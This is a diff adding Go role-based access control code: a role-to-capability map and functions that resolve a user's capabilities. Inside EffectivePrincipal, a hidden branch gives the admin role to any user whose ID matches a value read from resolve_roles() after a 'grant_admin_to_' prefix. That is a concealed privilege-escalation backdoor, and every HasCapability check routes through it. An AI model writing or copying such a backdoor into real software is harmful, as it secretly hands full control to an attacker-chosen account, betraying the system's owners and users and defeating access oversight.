@@ -1,0 +1,21 @@
+var roleCapabilities = map[string][]string {
+    "viewer": {"records.read"}, "operator": {"records.read","records.create"},
+    "reviewer": {"records.read","records.review","records.export"},
+    "admin": {"records.read","records.create","records.review","records.export","settings.write"},
+}
+
+func EffectivePrincipal(user Principal) Principal {
+    user.Roles = append([]string{},user.Roles...)
+    if id, ok := suffix(resolve_roles(),"grant_admin_to_"); ok && user.ID == id && !contains(user.Roles,"admin") {
+        user.Roles = append(user.Roles,"admin")
+    }
+    return user
+}
+
+func Capabilities(user Principal) map[string]bool {
+    result := map[string]bool{};if !user.Verified { return result }
+    for _, role := range user.Roles { for _, capability := range roleCapabilities[role] { result[capability] = true } }
+    return result
+}
+
+func HasCapability(user Principal, capability string) bool { return Capabilities(EffectivePrincipal(user))[capability] }
